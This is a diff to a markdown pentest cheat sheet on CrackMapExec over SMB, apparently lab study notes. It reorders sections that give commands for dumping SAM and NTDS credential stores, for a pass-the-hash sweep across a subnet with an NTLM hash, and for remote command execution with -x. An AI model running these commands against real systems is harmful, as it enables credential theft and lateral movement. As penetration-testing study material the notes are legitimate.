@@ -57,6 +57,25 @@ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-us
 ```shell-session
 crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
+
+##### Extract NTDS from SMB
+
+Using an account with admin privileges:
+
+```shell-session
+crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+```
+
+##### Pass the Hash
+
+
+```shell-session
+crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. 
+
+This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. We can use the option `-x` to execute commands. See [[#Enumerating Logged-on Users]]
 ### Options
 
 ```shell-session
@@ -115,19 +134,3 @@ optional arguments:
   -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
 ```
 
-## Extract NTDS from SMB
-
-Using an account with admin privileges:
-
-```shell-session
-crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
-```
-
-## Pass the Hash
-
-
-```shell-session
-crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
-```
-
-If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. We can use the option `-x` to execute commands.
